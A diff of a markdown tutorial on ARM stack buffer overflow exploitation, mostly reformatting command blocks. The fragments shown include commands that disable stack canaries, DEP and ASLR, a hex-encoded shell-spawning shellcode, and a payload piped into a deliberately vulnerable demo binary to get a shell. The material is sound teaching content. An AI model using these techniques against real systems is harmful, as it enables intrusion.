@@ -19,13 +19,13 @@ platform provided anti-exploitation countermeasures:
 ### Stack smash protector (SSP, stack canary): disable for Part 1 and Part 2
 When building vulnerable code
 ```
-    gcc -fno-stack-protector [other args] badcode.c
+$ gcc -fno-stack-protector [other args] badcode.c
 ```
 
 ### Non-executable stack (data execution prevention, DEP): disable for Part 1
 Mark binary `badcode` as requiring executable stack. 
 ```
-    execstack -s ./badcode
+$ execstack -s ./badcode
 ```
 
 Note: As it [turned
@@ -39,11 +39,11 @@ this particular platform.
 One can either disable ASLR on the vulnerable binary only during
 execution time
 ```
-    setarch `arch` -R ./badcode
+$ setarch `arch` -R ./badcode
 ```
 or temporarily disable ASLR on the entire platform
 ```
-    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
 
 To make it simple, in this tutorial we will only use the A32
@@ -75,14 +75,14 @@ The shell code can be extracted from the executable 'shell', compiled out of
 the source file [shell.c](src/shell.c), by the procedures that follow:
 
 ```
-    $ cd src
-    $ make shell
+$ cd src
+$ make shell
 ```
 
 Now the ELF 32-bit LSB executable 'shell' is generated. We use `objdump` to
 inspect the shell code of interest.
 ```
-    $ objdump -d shell | sed -n '/needle0/,/needle1/p'
+$ objdump -d shell | sed -n '/needle0/,/needle1/p'
 ```
 This prints
 ```assembly
@@ -109,10 +109,10 @@ This prints
 Because '0x415-0x3f0' equals 37 in decimal, we round it to 40 bytes (so
 that the code is 4-byte aligned) for the shell code.
 ```
-    $ xxd -s0x415 -l40 -p shell > shellcode
-    $ cat shellcode
-    040000ea0e00a0e1011021e0022022e00b70a0e3000000eff9ffffeb2f62
-    696e2f6261736800dead
+$ xxd -s0x415 -l40 -p shell > shellcode
+$ cat shellcode
+040000ea0e00a0e1011021e0022022e00b70a0e3000000eff9ffffeb2f62
+696e2f6261736800dead
 ```
 
 This is the shell code we are going to jump to after overrunning the stack
@@ -123,12 +123,12 @@ The bad C code, [badcode.c](src/badcode.c), exhibits a classic buffer overflow
 on the stack. To compile the code without stack protection and DEP, two
 OS-added anti-exploitation countermeasures, for the demonstration purpose, do
 ```
-    $ make badcode
+$ make badcode
 ```
 
 Now let's get some idea about the stack layout in the 'badcode' program.
 ```
-    $ gdb ./badcode
+$ gdb ./badcode
 ```
 
 Within the `gdb` console, disassemble the 'main' function
@@ -187,9 +187,9 @@ For the demonstration, we also disable ASLR when running the 'badcode'
 program (in the meanwhile 'badcode' also prints out the address of 'buf', to
 simplify the demonstration).
 ```
-    $ setarch `arch` -R ./badcode
-    0x7efff1f8
-    Enter name:
+$ setarch `arch` -R ./badcode
+0x7efff1f8
+Enter name:
 ```
 
 To implement the above strategy
@@ -218,9 +218,9 @@ To implement the above strategy
 3. Run exploit (using `cat` as stdin)
 
    ```
-    $ (cat payload; cat) | setarch `arch` -R ./badcode
-    0x7efff1f8
-    Enter name:
+   $ (cat payload; cat) | setarch `arch` -R ./badcode
+   0x7efff1f8
+   Enter name:
    ```
    Press 'enter', and now we have the shell
 
@@ -275,6 +275,16 @@ stack.
 
     ---  top of stack   ---
 ```
+
+### The bad code with DEP
+Our bad code is the same as before at the source level. But we turn on
+non-executable stack.
+```
+$ cd src
+$ make badcode_dep
+```
+The vulnerable binary is generated as 'badcode_dep'.
+
 
 ### Return on ARM
 
@@ -475,9 +485,5 @@ sscanf
 ```
 Use `memcpy` with extra care.
 
-
-
-
-
-
-
+**This is a long-overdue tutorial that I wanted to get done at least 5
+years ago. I am glad I finally did it.**
